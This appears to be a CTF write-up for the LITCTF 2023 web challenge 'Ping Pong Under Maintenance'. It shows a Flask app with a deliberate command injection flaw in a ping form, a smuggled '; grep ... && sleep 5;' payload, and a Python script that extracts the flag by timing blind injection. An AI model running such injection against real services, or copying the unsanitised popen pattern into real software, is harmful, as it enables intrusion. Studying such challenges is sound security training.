---
title: 2023 LITCTF - Ping Pong Under Maintenance
author: thanguyen165
date: 2023-08-08 00:00:00 +0700
categories: [Write-ups, 2023_LITCTF]
tags: [Web Exploitation, write-ups]
---

* 90 solves / 158 points
* Author: eyangch

## Description

> The website seems to be under maintenance.

### Attached

[ping-pong-under-maintenance](http://34.27.167.72/dl/?web%2FPing+Pong_+Under+Maintenance%2Fping-pong-under-maintenance.zip=)

```py
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.')

```
{: file="pingpong.py" }

## Analyzation

In this challenge, we cannot see the output anymore. So we use time-based blind injection.

Use command
```
grep "LIT" flag.txt && sleep 5;
```

- If ```grep "LIT" flag.txt``` is correct, aka string ```"LIT"``` is in ```flag.txt``` content, the second command ```sleep 5``` will be executed, and it takes more time to return response.

## Solution

```py
import requests, string, time

ALPHABET = "}_" + string.ascii_lowercase + string.digits + string.ascii_uppercase
URL_PINGPONGUnderMaintenance = 'http://34.130.180.82:53558/' # change this link

HEADERS={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5'
}

flag = "LITCTF{"
TEMPLATE_PAYLOAD = '; grep "{}" flag.txt && sleep 5;'

while flag[-1] != '}':
    for character in ALPHABET:
        print("char: %s" % character) # log the process.
        flag_tmp = flag + str(character)

        START_TIME = time.time()
        respond = requests.post(URL_PINGPONGUnderMaintenance, headers=HEADERS, data={'hostname': TEMPLATE_PAYLOAD.format(flag_tmp)})

        if time.time() - START_TIME > 5:
            flag = flag_tmp
            print("true: {}".format(flag)) # log the process.
            break

print(flag)

```
{: file="solution.py" }

The flag is
```
LITCTF{c4refu1_fr}
```